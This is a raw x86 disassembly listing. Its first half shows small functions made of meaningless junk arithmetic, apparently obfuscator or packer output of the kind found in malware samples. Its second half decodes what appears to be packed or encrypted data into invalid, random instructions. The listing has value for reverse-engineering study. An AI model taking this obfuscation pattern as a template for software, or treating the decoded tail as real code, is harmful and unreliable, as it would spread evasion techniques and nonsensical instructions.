  408d82:	cmp    ecx,DWORD PTR [ebp-0xc]
  408d85:	je     0x408d9b
  408d87:	add    ecx,edi
  408d89:	mov    DWORD PTR [ebp-0x4],edx
  408d8c:	mov    edx,DWORD PTR [ebp-0x14]
  408d8f:	and    DWORD PTR [ebp-0x4],edx
  408d92:	sub    ecx,ebx
  408d94:	cmp    ecx,eax
  408d96:	jne    0x408d9b
  408d98:	add    DWORD PTR [ebp-0x4],ecx
  408d9b:	leave  
  408d9c:	ret    
  408d9d:	int3   
  408d9e:	int3   
  408d9f:	int3   
  408da0:	int3   
  408da1:	int3   
  408da2:	push   ebp
  408da3:	mov    ebp,esp
  408da5:	sub    esp,0x24
  408da8:	xor    edx,edx
  408daa:	add    edx,edx
  408dac:	add    edx,edx
  408dae:	mov    eax,DWORD PTR ds:0x44a3d4
  408db4:	add    edx,eax
  408db6:	and    edx,eax
  408db8:	sub    edx,eax
  408dba:	sub    edx,eax
  408dbc:	or     edx,eax
  408dbe:	sub    edx,eax
  408dc0:	and    edx,eax
  408dc2:	sub    edx,eax
  408dc4:	mov    DWORD PTR [ebp-0x8],edx
  408dc7:	push   ebx
  408dc8:	sub    edx,eax
  408dca:	mov    ecx,0x473b
  408dcf:	mov    DWORD PTR [ebp-0x8],ecx
  408dd2:	sub    DWORD PTR [ebp-0x8],eax
  408dd5:	sub    edx,eax
  408dd7:	add    edx,edx
  408dd9:	mov    ecx,0xb1
  408dde:	add    DWORD PTR [ebp-0x8],ecx
  408de1:	and    DWORD PTR [ebp-0x8],edx
  408de4:	push   esi
  408de5:	mov    eax,edx
  408de7:	mov    esi,0xfb
  408dec:	add    DWORD PTR [ebp-0x8],esi
  408def:	and    DWORD PTR [ebp-0x8],esi
  408df2:	and    DWORD PTR [ebp-0x8],eax
  408df5:	push   edi
  408df6:	mov    ecx,DWORD PTR ds:0x44a3c4
  408dfc:	mov    esi,DWORD PTR [ebp-0x8]
  408dff:	add    esi,esi
  408e01:	add    DWORD PTR [ebp-0x8],ecx
  408e04:	add    esi,esi
  408e06:	or     DWORD PTR [ebp-0x8],esi
  408e09:	xor    DWORD PTR [ebp-0x8],eax
  408e0c:	and    DWORD PTR [ebp-0x8],eax
  408e0f:	mov    eax,ecx
  408e11:	add    DWORD PTR [ebp-0x8],eax
  408e14:	mov    ebx,DWORD PTR [ebp-0x8]
  408e17:	mov    edi,edx
  408e19:	cmp    ebx,DWORD PTR [ebp-0x10]
  408e1c:	je     0x408e70
  408e1e:	mov    esi,DWORD PTR [ebp-0x8]
  408e21:	add    edi,edi
  408e23:	mov    edx,0x8501422a
  408e28:	add    edi,esi
  408e2a:	cmp    ebx,ecx
  408e2c:	jne    0x408e70
  408e2e:	add    ebx,edi
  408e30:	cmp    ebx,esi
  408e32:	jne    0x408e70
  408e34:	and    ebx,esi
  408e36:	xor    esi,esi
  408e38:	and    edx,edi
  408e3a:	add    DWORD PTR [ebp-0x8],esi
  408e3d:	mov    edi,DWORD PTR ds:0x44a3cc
  408e43:	cmp    ebx,0xffffffc4
  408e46:	je     0x408e70
  408e48:	cmp    ebx,DWORD PTR [ebp-0x4]
  408e4b:	je     0x408e70
  408e4d:	add    DWORD PTR [ebp-0x8],edx
  408e50:	mov    eax,0x8
  408e55:	mov    edx,DWORD PTR [ebp-0x8]
  408e58:	add    ebx,edx
  408e5a:	add    DWORD PTR [ebp-0x8],ebx
  408e5d:	sub    DWORD PTR [ebp-0x8],edx
  408e60:	and    eax,esi
  408e62:	mov    DWORD PTR [ebp-0x24],ecx
  408e65:	add    DWORD PTR [ebp-0x24],ecx
  408e68:	and    eax,ebx
  408e6a:	sub    DWORD PTR [ebp-0x24],edi
  408e6d:	sub    DWORD PTR [ebp-0x8],eax
  408e70:	or     DWORD PTR [ebp-0x8],ecx
  408e73:	pop    edi
  408e74:	add    ebx,edx
  408e76:	add    ebx,edi
  408e78:	sub    DWORD PTR [ebp-0x8],ebx
  408e7b:	pop    esi
  408e7c:	add    DWORD PTR [ebp-0x8],esi
  408e7f:	pop    ebx
  408e80:	cmp    ebx,edi
  408e82:	je     0x408e87
  408e84:	sub    DWORD PTR [ebp-0x8],ebx
  408e87:	leave  
  408e88:	ret    
  408e89:	int3   
  408e8a:	int3   
  408e8b:	int3   
  408e8c:	int3   
  408e8d:	int3   
  408e8e:	push   ebp
  408e8f:	mov    ebp,esp
  408e91:	sub    esp,0x34
  408e94:	mov    ecx,0x58
  408e99:	mov    eax,0x88
  408e9e:	mov    DWORD PTR [ebp-0x10],ecx
  408ea1:	sub    DWORD PTR [ebp-0x10],eax
  408ea4:	push   ebx
  408ea5:	mov    ecx,DWORD PTR [ebp-0x10]
  408ea8:	xor    DWORD PTR [ebp-0x10],ecx
  408eab:	push   esi
  408eac:	cmp    ecx,DWORD PTR [ebp-0xc]
  408eaf:	jne    0x408ec7
  408eb1:	and    eax,ecx
  408eb3:	mov    esi,0xd9
  408eb8:	and    eax,esi
  408eba:	mov    ebx,0x19
  408ebf:	and    DWORD PTR [ebp-0x10],eax
  408ec2:	and    ebx,esi
  408ec4:	add    DWORD PTR [ebp-0x10],ebx
  408ec7:	push   edi
  408ec8:	mov    edx,DWORD PTR [ebp-0x10]
  408ecb:	cmp    edx,0x4b2e
  408ed1:	je     0x408edb
  408ed3:	cmp    edx,0xffffffc1
  408ed6:	je     0x408edb
  408ed8:	and    DWORD PTR [ebp-0x10],edx
  408edb:	mov    ecx,ebx
  408edd:	add    ecx,eax
  408edf:	or     ecx,esi
  408ee1:	add    DWORD PTR [ebp-0x10],ecx
  408ee4:	mov    ebx,0xd2fb
  408ee9:	mov    edx,ebx
  408eeb:	and    ecx,eax
  408eed:	sub    DWORD PTR [ebp-0x10],ecx
  408ef0:	add    edx,eax
  408ef2:	add    DWORD PTR [ebp-0x10],edx
  408ef5:	and    ecx,ebx
  408ef7:	add    ecx,eax
  408ef9:	cmp    ecx,0xc2f7
  408eff:	jne    0x408f10
  408f01:	xor    edi,edi
  408f03:	mov    esi,DWORD PTR [ebp-0x10]
  408f06:	or     ecx,edi
  408f08:	add    DWORD PTR [ebp-0x10],ecx
  408f0b:	and    esi,ebx
  408f0d:	sub    DWORD PTR [ebp-0x10],esi
  408f10:	xor    ebx,ebx
  408f12:	add    ebx,eax
  408f14:	add    DWORD PTR [ebp-0x10],ebx
  408f17:	pop    edi
  408f18:	mov    eax,edi
  408f1a:	mov    ecx,DWORD PTR [ebp-0x10]
  408f1d:	sub    ecx,eax
  408f1f:	sub    DWORD PTR [ebp-0x10],ecx
  408f22:	pop    esi
  408f23:	mov    ecx,DWORD PTR [ebp-0x10]
  408f26:	mov    edx,0x621
  408f2b:	add    edx,esi
  408f2d:	add    ecx,esi
  408f2f:	or     edx,ecx
  408f31:	cmp    edx,0xffffff95
  408f34:	je     0x408f94
  408f36:	mov    ecx,DWORD PTR ds:0x44a39c
  408f3c:	mov    eax,DWORD PTR [ebp-0x10]
  408f3f:	sub    edx,ecx
  408f41:	add    DWORD PTR [ebp-0x10],eax
  408f44:	add    edx,edx
  408f46:	add    edx,ebx
  408f48:	cmp    edx,ebx
  408f4a:	jne    0x408f94
  408f4c:	mov    ebx,DWORD PTR [ebp-0x10]
  408f4f:	cmp    edx,0x1191
  408f55:	je     0x408f94
  408f57:	mov    ecx,edi
  408f59:	cmp    ebx,0xfffffff2
  408f5c:	jne    0x408f94
  408f5e:	mov    eax,DWORD PTR ds:0x44a3c0
  408f64:	add    DWORD PTR [ebp-0x10],ecx
  408f67:	and    eax,esi
  408f69:	test   edx,0x461e
  408f6f:	jne    0x408f94
  408f71:	cmp    edi,edx
  408f73:	je     0x408f94
  408f75:	mov    ecx,edi
  408f77:	add    eax,edx
  408f79:	sub    ebx,edx
  408f7b:	add    DWORD PTR [ebp-0x10],ecx
  408f7e:	mov    DWORD PTR [ebp-0x20],ebx
  408f81:	cmp    eax,0xffffffaf
  408f84:	je     0x408f94
  408f86:	sub    DWORD PTR [ebp-0x10],esi
  408f89:	mov    ecx,0x4f921110
  408f8e:	add    DWORD PTR [ebp-0x10],ecx
  408f91:	sub    DWORD PTR [ebp-0x20],eax
  408f94:	pop    ebx
  408f95:	cmp    ebx,0x5f
  408f98:	je     0x408fdd
  408f9a:	and    edx,ebx
  408f9c:	mov    eax,edx
  408f9e:	xor    edx,edx
  408fa0:	and    eax,ebx
  408fa2:	cmp    eax,0xffffff96
  408fa5:	je     0x408fdd
  408fa7:	mov    ecx,0x1
  408fac:	cmp    eax,ecx
  408fae:	jne    0x408fdd
  408fb0:	mov    edx,DWORD PTR [ebp-0x10]
  408fb3:	add    DWORD PTR [ebp-0x10],edx
  408fb6:	mov    edx,DWORD PTR [ebp-0x10]
  408fb9:	cmp    edx,0x68
  408fbc:	je     0x408fdd
  408fbe:	test   edx,0x4a
  408fc4:	jne    0x408fdd
  408fc6:	add    edx,eax
  408fc8:	add    DWORD PTR [ebp-0x10],edx
  408fcb:	mov    eax,DWORD PTR [ebp-0x10]
  408fce:	add    eax,eax
  408fd0:	cmp    eax,DWORD PTR [ebp-0x2c]
  408fd3:	jne    0x408fdd
  408fd5:	add    DWORD PTR [ebp-0x10],eax
  408fd8:	sub    ecx,ebx
  408fda:	sub    DWORD PTR [ebp-0x10],ecx
  408fdd:	leave  
  408fde:	ret    
  408fdf:	add    BYTE PTR [ebx+0x43],cl
  408fe2:	lods   eax,DWORD PTR ds:[si]
  408fe4:	and    DWORD PTR [esi+0x28eff17e],eax
  408fea:	shl    BYTE PTR [esi+0x62],1
  408fed:	mov    ebx,0x8f6f134d
  408ff2:	adc    ebx,edx
  408ff4:	shl    DWORD PTR [edi+0x16c27e43],cl
  408ffa:	dec    ebp
  408ffb:	xor    bh,bl
  408ffd:	fdiv   st(4),st
  408fff:	(bad)  
  409000:	mov    al,0xc6
  409002:	das    
  409003:	xchg   esp,eax
  409004:	xchg   esp,eax
  409005:	mov    esp,0xba8e8adc
  40900a:	sub    al,0x9a
  40900c:	mov    ah,cl
  40900e:	das    
  40900f:	scas   eax,DWORD PTR es:[edi]
  409010:	cdq    
  409011:	fistp  WORD PTR [eax]
  409013:	shr    eax,cl
  409015:	fbld   TBYTE PTR [ebx+edx*1]
  409018:	fs std 
  40901a:	cld    
  40901b:	pop    ebp
  40901c:	out    0xdf,eax
  40901e:	jo     0x408fb3
  409020:	iret   
  409021:	fwait
  409022:	cld    
  409023:	(bad)  
  409024:	jmp    0x409005
  409026:	pop    ss
  409027:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409028:	cdq    
  409029:	mov    ecx,0xddaac19
  40902e:	shl    DWORD PTR [ebx-0x52034471],cl
  409034:	xchg   edi,eax
  409035:	ret    
  409036:	adc    BYTE PTR [ebp+ecx*8-0x1453ef3d],ch
  40903d:	mov    dl,0x77
  40903f:	sub    al,0x8b
  409041:	or     al,0xbd
  409043:	push   ebx
  409044:	mov    eax,0xef8d77d7
  409049:	add    al,0xb5
  40904b:	xchg   ebp,eax
  40904c:	icebp  
  40904d:	push   esp
  40904e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40904f:	outs   dx,BYTE PTR ds:[esi]
  409050:	cwde   
  409051:	dec    edx
  409052:	xor    al,0x53
  409054:	cs hlt 
  409056:	mov    dh,0x17
  409058:	cmp    ecx,DWORD PTR ds:0xd75a89ff
  40905e:	int    0x30
  409060:	call   0x9287:0x6ae7e9e2
  409067:	push   ds
  409068:	xor    dl,dl
  40906a:	scas   eax,DWORD PTR es:[edi]
  40906b:	sub    cl,BYTE PTR [edi]
  40906d:	push   eax
  40906e:	int    0x51
  409070:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409071:	add    eax,DWORD PTR [ecx]
  409073:	test   eax,0xc7f51d34
  409078:	mov    eax,0x27499154
  40907d:	inc    edi
  40907e:	mov    ds:0xbbbf1e1f,eax
  409083:	inc    ebp
  409084:	and    ecx,DWORD PTR [ecx-0x5c]
  409087:	pop    ds
  409088:	jmp    0x409069
  40908a:	cld    
  40908b:	(bad)  
  40908c:	push   0xffffffca
  40908e:	hlt    
  40908f:	(bad)  
  409090:	out    dx,al
  409091:	arpl   WORD PTR [eax+ecx*8-0x15],bx
  409095:	fbstp  TBYTE PTR [edi-0x6b]
  409098:	repz pop edx
  40909a:	(bad)  
  40909b:	enter  0x481e,0xa4
  40909f:	popa   
  4090a0:	jmp    0x409080
  4090a2:	cld    
  4090a3:	(bad)  
  4090a4:	dec    edi
  4090a5:	or     edi,DWORD PTR [esi]
  4090a7:	call   0xfbe9:0x97470be5
  4090ae:	pushf  
  4090af:	jb     0x4090a2
  4090b1:	pop    ds
  4090b2:	sub    ecx,edx
  4090b4:	mov    ah,0xd8
  4090b6:	js     0x409102
  4090b8:	jmp    0x409099
  4090ba:	cld    
  4090bb:	xor    al,BYTE PTR [esi]
  4090bd:	pop    edx
  4090be:	push   0xffffffc8
  4090c0:	push   ds
  4090c1:	dec    eax
  4090c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090c3:	repz sbb eax,0x95c9a45c
  4090c9:	int3   
  4090ca:	push   ss
  4090cb:	enter  0x37b5,0x18
  4090cf:	pop    ds
  4090d0:	push   ds
  4090d1:	dec    eax
  4090d2:	jbe    0x409119
  4090d4:	pop    ds
  4090d5:	dec    ecx
  4090d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090d7:	pop    ds
  4090d8:	xchg   DWORD PTR [edx+ecx*1-0x28],edx
  4090dc:	jmp    0x4090bd
  4090de:	cld    
  4090df:	push   edx
  4090e0:	mov    ecx,0xef7a77db
  4090e5:	push   esp
  4090e6:	(bad)  
  4090e7:	xor    esp,ebp
  4090e9:	push   esp
  4090ea:	pavgw  mm7,QWORD PTR [edx]
  4090ed:	shl    DWORD PTR [edx],cl
  4090ef:	push   ebx
  4090f0:	cdq    
  4090f1:	(bad)  
  4090f3:	pop    ebp
  4090f4:	jmp    0x40913e
  4090f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090f7:	pop    ds
  4090f8:	fs (bad) 
  4090fb:	(bad)  
  4090fc:	jmp    0x4090d2
  4090fe:	stos   BYTE PTR es:[edi],al
  4090ff:	xchg   esp,eax
  409100:	adc    eax,ecx
  409102:	push   ecx
  409103:	fsubr  QWORD PTR [ebp+ecx*8-0x2f3e2406]
  40910a:	(bad)  
  40910b:	jmp    0x409118
  40910d:	jne    0x409106
  40910f:	pop    es
  409110:	xchg   edi,eax
  409111:	loop   0x409148
  409113:	xchg   esp,eax
  409114:	aaa    
  409115:	xor    al,0x97
  409117:	dec    ebp
  409118:	pop    eax
  409119:	fbld   TBYTE PTR [ebx-0x5d0be1e1]
  40911f:	dec    ebx
  409120:	push   ds
  409121:	fisubr WORD PTR [edx]
  409123:	add    eax,0x304adf91
  409128:	cld    
  409129:	dec    eax
  40912a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40912b:	pop    ds
  40912c:	loop   0x409190
  40912e:	mov    eax,ds:0x2a481e1e
  409133:	push   ebp
  409134:	jb     0x4090d3
  409136:	add    al,0x51
  409138:	push   0x1e1fa347
  40913d:	mov    esi,0x49234577
  409142:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409143:	pop    ds
  409144:	xor    al,0x1d
  409146:	stc    
  409147:	(bad)  
  409148:	mov    eax,0x2bdb9154
  40914d:	mov    edi,0xd3f384e5
  409152:	ss push ebx
  409154:	rcl    bh,0xff
  409157:	sbb    bh,0x54
  40915a:	dec    eax
  40915b:	mov    al,ds:0x52f4aaea
  409160:	call   0xcf0c:0xf394ffff
  409167:	jecxz  0x409123
  409169:	out    0x2f,eax
  40916b:	fst    DWORD PTR [eax-0x24]
  40916e:	cmp    eax,edx
  409170:	xchg   ecx,eax
  409171:	fisttp WORD PTR [eax+esi*1+0x28]
  409175:	dec    ecx
  409176:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409177:	pop    ds
  409178:	in     al,0xa2
  40917a:	lock xchg ebx,eax
  40917c:	jmp    0x3d:0x3c27979d
  409183:	jnp    0x40914c
  409185:	fmul   QWORD PTR [ecx-0x30]
  409188:	out    dx,al
  409189:	nop
  40918a:	dec    DWORD PTR [eax]
  40918c:	or     ebx,ebp
  40918e:	dec    DWORD PTR [edx-0x2fc62301]
  409194:	jb     0x409175
  409196:	inc    DWORD PTR [ebx+esi*8-0x1bc6aa]
  40919d:	mov    esi,0xdff30ab5
  4091a2:	dec    ecx
  4091a3:	push   ebx
  4091a4:	cmovs  ebp,DWORD PTR [edx]
  4091a7:	int3   
  4091a8:	push   ds
  4091a9:	shl    ah,cl
  4091ab:	das    
  4091ac:	or     DWORD PTR [eax-0x5c],0x1f
  4091b0:	xor    al,0x60
  4091b2:	stc    
  4091b3:	jecxz  0x40921b
  4091b5:	mov    ds:0xe329cfd8,eax
  4091ba:	cld    
  4091bb:	je     0x40922f
  4091bd:	cmp    eax,DWORD PTR [eax-0x6b40f0fc]
  4091c3:	enter  0xdfeb,0xfc
  4091c7:	dec    eax
  4091c8:	iret   
  4091c9:	add    ecx,DWORD PTR [edi+0x47dfabbb]
  4091cf:	dec    ebp
  4091d0:	push   0x49
  4091d2:	push   cs
  4091d3:	mov    bl,ch
  4091d5:	scas   eax,DWORD PTR es:[edi]
  4091d6:	xchg   esp,eax
  4091d7:	cmp    eax,0x51a4481d
  4091dc:	test   al,0x4b
  4091de:	adc    eax,0xec839bf7
  4091e3:	push   ds
  4091e4:	cwde   
  4091e5:	dec    ebx
  4091e6:	xchg   ebp,eax
  4091e7:	jge    0x409207
  4091e9:	dec    eax
  4091ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091eb:	push   ecx
  4091ec:	test   al,0x47
  4091ee:	adc    eax,0xac707c92
  4091f3:	pop    ds
  4091f4:	cwde   
  4091f5:	dec    ebx
  4091f6:	xchg   ebp,eax
  4091f7:	lea    ebx,[esi]
  4091f9:	dec    eax
  4091fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091fb:	push   ecx
  4091fc:	test   al,0x53
  4091fe:	js     0x409185
  409200:	pop    ds
  409201:	fdivr  QWORD PTR [esp+ebx*8]
  409204:	out    dx,al
  409205:	nop
  409206:	dec    ebp
  409207:	mov    ah,0x70
  409209:	mov    ds:0xaf72bffe,eax
  40920e:	lock retf 0x4bb8
  409212:	jbe    0x409289
  409214:	sbb    ebx,esp
  409216:	dec    esp
  409217:	mov    eax,0x5390b274
  40921c:	mov    al,ds:0x1b95783b
  409221:	add    al,0xac
  409223:	xchg   esp,eax
  409224:	mov    BYTE PTR [ebx-0x1f],bh
  409227:	das    
  409228:	cwde   
  409229:	push   eax
  40922a:	js     0x4091f2
  40922c:	jo     0x4091d1
  40922e:	in     al,dx
  40922f:	ret    
  409230:	loop   0x4091d4
  409232:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409233:	xchg   ebp,eax
  409234:	jbe    0xe02c5a17
  40923a:	jno    0x4092b2
  40923c:	and    BYTE PTR [ebp-0x4a1eb6e6],dl
  409242:	cmc    
  409243:	xchg   ebx,eax
  409244:	out    0x3d,eax
  409246:	stos   DWORD PTR es:[edi],eax
  409247:	xor    eax,DWORD PTR [ebx-0x6b]
  40924a:	jl     0x40922e
  40924c:	adc    edx,edx
  40924e:	add    al,0x53
  409250:	mov    cl,0xde
  409252:	jno    0x4091e0
  409254:	cld    
  409255:	loop   0x40923e
  409257:	mov    WORD PTR [ebx],ds
  409259:	int    0xf0
  40925b:	loop   0x40920d
  40925d:	cmp    esi,DWORD PTR [eax]
  40925f:	(bad)  
  409260:	loop   0x4091fc
  409262:	test   al,0x94
  409264:	jmp    0xe189f99d
  409269:	outs   dx,DWORD PTR ds:[esi]
  40926a:	lea    edi,[eax]
  40926c:	jnp    0x409241
  40926e:	or     dl,BYTE PTR [ebx-0x17]
  409271:	add    ch,BYTE PTR [ebp-0x1db0e4e8]
  409277:	ja     0x409234
  409279:	scas   eax,DWORD PTR es:[edi]
  40927a:	dec    esp
  40927b:	xchg   ebp,eax
  40927c:	in     eax,0x5f
  40927e:	daa    
  40927f:	push   ds
  409280:	adc    dl,bl
  409282:	stc    
  409283:	xor    ah,BYTE PTR [edi]
  409285:	pop    esp
  409286:	mov    edi,0x1e2d1ec4
  40928b:	adc    DWORD PTR [ecx],ebp
  40928d:	jecxz  0x40928b
  40928f:	je     0x409303
  409291:	cmp    ebx,DWORD PTR ds:0x77db9853
  409297:	popf   
  409298:	repz dec ebx
  40929a:	outs   dx,DWORD PTR ds:[esi]
  40929b:	dec    eax
  40929c:	fisub  DWORD PTR [ecx+ebx*2]
  40929f:	pop    ebx
  4092a0:	jmp    0xec08a4dc
  4092a5:	fild   QWORD PTR [edi]
  4092a7:	push   ss
  4092a8:	ficom  DWORD PTR [esi]
  4092aa:	xchg   ebp,eax
  4092ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092ac:	jmp    0x40928d
  4092ae:	cld    
  4092af:	call   0xdfc2:0x30bd0cff
  4092b6:	cld    
  4092b7:	(bad)  
  4092b8:	call   0xd8f:0xacca6ffc
  4092bf:	xor    BYTE PTR [esi-0x6380321],ch
  4092c5:	pop    ds
  4092c6:	xor    BYTE PTR [edi],dl
  4092c8:	cwde   
  4092c9:	or     BYTE PTR [edi+0x33],dl
  4092cc:	aaa    
  4092cd:	aaa    
  4092ce:	xor    cl,al
  4092d0:	jmp    0x4092b1
  4092d2:	xlat   BYTE PTR ds:[ebx]
  4092d3:	adc    bl,BYTE PTR [eax-0x14756b11]
  4092d9:	(bad)  
  4092db:	xor    dl,bl
  4092dd:	jnp    0x4092ad
  4092df:	xor    BYTE PTR [edi+0x12110f9a],dl
  4092e5:	jmp    0x409274
  4092e7:	nop
  4092e8:	sub    al,0x3f
  4092ea:	cmc    
  4092eb:	imul   edx,DWORD PTR [ebx],0xfffffffb
  4092ee:	cld    
  4092ef:	(bad)  
  4092f0:	jmp    0x4092fc
  4092f2:	std    
  4092f3:	pushf  
  4092f4:	jmp    0x4092d5
  4092f6:	das    
  4092f7:	shr    BYTE PTR [ebx+0x4b],cl
  4092fa:	cli    
  4092fb:	call   0xdd96:0x9fa55ce5
  409302:	cmp    eax,0xba547889
  409307:	pop    ebx
  409308:	in     al,dx
  409309:	mov    cl,0x77
  40930b:	pop    ss
  40930c:	ror    BYTE PTR [edi-0x50],cl
  40930f:	fs mov ebp,0x39ca7334
  409315:	sar    cl,cl
  409317:	push   ecx
  409318:	cmc    
  409319:	mov    eax,ds:0xc2afa0e
  40931e:	mov    dh,0x89
  409320:	adc    edi,DWORD PTR [ecx]
  409322:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409323:	pop    ds
  409324:	push   ds
  409325:	in     al,dx
  409326:	mov    ch,0x30
  409328:	push   es
  409329:	dec    eax
  40932a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40932b:	pop    ds
  40932c:	cdq    
  40932d:	dec    ebp
  40932e:	shl    bl,0x9f
  409331:	add    edx,ebp
  409333:	push   eax
  409334:	lahf   
  409335:	add    eax,DWORD PTR [ecx]
  409337:	test   eax,0xc7f51d34
  40933c:	mov    eax,0x274b9154
  409341:	dec    edi
  409342:	sbb    eax,0xd9d7a853
  409347:	(bad)  
  409348:	sbb    ecx,DWORD PTR [eax-0x5c]
  40934b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40934c:	ins    BYTE PTR es:[edi],dx
  40934d:	pop    es
  40934e:	xor    al,BYTE PTR [edx+0x7877ec98]
  409354:	fistp  WORD PTR [esi-0x59]
  409357:	enter  0xdffb,0xfc
  40935b:	call   0xafe9:0xdc7dc1f3
  409362:	cmp    DWORD PTR [esi+eiz*8-0x14480306],edx
  409369:	fist   WORD PTR [edi-0xb5d8b01]
  40936f:	das    
  409370:	jmp    0x409351
  409372:	cld    
  409373:	(bad)  
  409374:	ins    BYTE PTR es:[edi],dx
  409375:	sti    
  409376:	fcomp  st(6)
  409378:	clc    
  409379:	lahf   
  40937a:	cld    
  40937b:	xor    BYTE PTR [eax+0x5c],0xae
  40937f:	mov    ecx,0x304cdfab
  409384:	sbb    ecx,DWORD PTR [ebx-0x5c]
  409387:	pop    ds
  409388:	je     0x40932c
  40938a:	lods   al,BYTE PTR ds:[esi]
  40938b:	popa   
  40938c:	shl    ecx,cl
  40938e:	cld    
  40938f:	(bad)  
  409390:	jmp    0x75df:0xabb9c254
  409397:	lea    esp,[ebx]
  409399:	mov    ch,0x3c
  40939b:	mov    al,0xeb
  40939d:	paddw  mm0,mm7
  4093a0:	mov    esp,0xb1affcb5
  4093a5:	fidiv  DWORD PTR [edx-0x532de12f]
  4093ab:	xor    BYTE PTR [ecx],bl
  4093ad:	dec    edx
  4093ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093af:	pop    ds
  4093b0:	je     0x409354
  4093b2:	mov    al,ds:0xe1f5a4d
  4093b7:	mov    bl,ch
  4093b9:	push   esp
  4093ba:	and    bl,BYTE PTR [edx+esi*2]
  4093bd:	call   0x1bc2:0xf43ecba4
  4093c4:	inc    edi
  4093c5:	pop    edx
  4093c6:	add    BYTE PTR [eax-0x8],0x9f
  4093ca:	cld    
  4093cb:	push   ds
  4093cc:	or     ebx,DWORD PTR [edx+0x70]
  4093cf:	xor    dh,dh
  4093d1:	lahf   
  4093d2:	cld    
  4093d3:	push   ds
  4093d4:	pop    edx
  4093d5:	sub    cl,BYTE PTR [esi]
  4093d7:	mov    bl,ch
  4093d9:	mov    cl,0x94
  4093db:	jle    0x4093fc
  4093dd:	dec    eax
  4093de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093df:	jecxz  0x40944b
  4093e1:	ds push cs
  4093e3:	mov    bl,ch
  4093e5:	fdivr  DWORD PTR [ecx-0x15]
  4093e8:	jmp    0x5a5f90cc
  4093ed:	inc    edx
  4093ee:	push   cs
  4093ef:	mov    bl,ch
  4093f1:	mov    ch,0x3c
  4093f3:	mov    al,0xdc
  4093f5:	shl    DWORD PTR [eax-0x61],cl
  4093f8:	push   ds
  4093f9:	shr    BYTE PTR [eax+esi*1+0x1fa44a49],cl
  409400:	je     0x4093a4
  409402:	test   al,0xd3
  409404:	sub    ebx,eax
  409406:	js     0x4093d3
  409408:	jmp    0x239390ec
  40940d:	mov    cl,0x4b
  40940f:	xor    BYTE PTR [edx-0x1de05bb7],ah
  409415:	pop    esp
  409416:	call   0xd44:0xf3dfabb9
  40941d:	fdivp  st(4),st
  40941f:	(bad)  
  409420:	mov    ebx,0x1fb694b0
  409425:	dec    eax
  409426:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409427:	jecxz  0x409493
  409429:	ss push cs
  40942b:	mov    bl,ch
  40942d:	fdivr  DWORD PTR [ecx+0x3]
  409430:	in     al,dx
  409431:	(bad)  
  409433:	push   edx
  409434:	cwde   
  409435:	xlat   BYTE PTR ds:[ebx]
  409436:	ja     0x4093d5
  409438:	pop    ss
  409439:	xchg   cl,ah
  40943b:	(bad)  
  40943c:	jmp    0x40941d
  40943e:	in     eax,0xcb
  409440:	in     al,0xcd
  409442:	(bad)  
  409443:	sbb    al,BYTE PTR [edi+0x54]
  409446:	sub    dl,al
  409448:	jb     0x409414
  40944a:	test   al,0xcb
  40944c:	sahf   
  40944d:	or     eax,DWORD PTR [eax]
  40944f:	xchg   esi,eax
  409450:	ffreep st(1)
  409452:	ja     0x4093da
  409454:	cmc    
  409455:	shl    DWORD PTR [ebp-0x79],0xf5
  409459:	push   esp
  40945a:	xor    dl,BYTE PTR [edx+ebp*8]
  40945d:	xchg   esi,eax
  40945e:	loopne 0x409411
  409460:	jmp    0x409415
  409462:	push   ss
  409463:	mov    BYTE PTR [esi],bl
  409465:	into   
  409466:	dec    esp
  409467:	pop    ds
  409468:	cwde   
  409469:	xlat   BYTE PTR ds:[ebx]
  40946a:	adc    al,0xef
  40946c:	mov    fs,ecx
  40946e:	or     al,0x1f
  409470:	cwde   
  409471:	dec    edi
  409472:	xchg   ebp,eax
  409473:	repz and BYTE PTR [eax-0x5c],cl
  409477:	xor    BYTE PTR [edx-0x36],0xf4
  40947b:	push   edx
  40947c:	cwde   
  40947d:	push   ebx
  40947e:	js     0x40948e
  409480:	jmp    0xafb3:0xb452e099
  409487:	fs jb  0x409434
  40948a:	hlt    
  40948b:	retf   0xbc2
  40948e:	hlt    
  40948f:	push   esi
  409490:	mov    dl,0xe1
  409492:	repz push esi
  409494:	call   0x4ae7:0xfd9471f3
  40949b:	jns    0x40950f
  40949d:	retf   0xcaf4
  4094a0:	popf   
  4094a1:	(bad)  [edi-0x72]
  4094a4:	repz push esp
  4094a6:	inc    eax
  4094a7:	loopne 0x40945c
  4094a9:	fdiv   QWORD PTR [edi+edx*1+0x9b4fc3b]
  4094b0:	adc    al,0xdd
  4094b2:	out    dx,eax
  4094b3:	pop    es
  4094b4:	sbb    dh,BYTE PTR [eax+edi*2-0x72]
  4094b8:	sti    
  4094b9:	push   esp
  4094ba:	and    ecx,esp
  4094bc:	jb     0x40948f
  4094be:	or     bl,cl
  4094c0:	cwde   
  4094c1:	push   ebx
  4094c2:	add    BYTE PTR [ebp-0x7ea6b30d],bl
  4094c8:	mov    ebp,0x9f0bb5c
  4094cd:	sbb    esp,DWORD PTR [ebp+edx*4-0x417e48e9]
  4094d4:	xchg   edx,eax
  4094d5:	mov    esp,0x371b95a3
  4094da:	mov    ecx,0x78481e1c
  4094df:	push   ebx
  4094e0:	addr16 (bad) 
  4094e3:	(bad)  
  4094e4:	or     dh,BYTE PTR [edi+esi*2-0x32094bd]
  4094eb:	(bad)  
  4094ec:	jmp    0xf7db:0x9a52f4aa
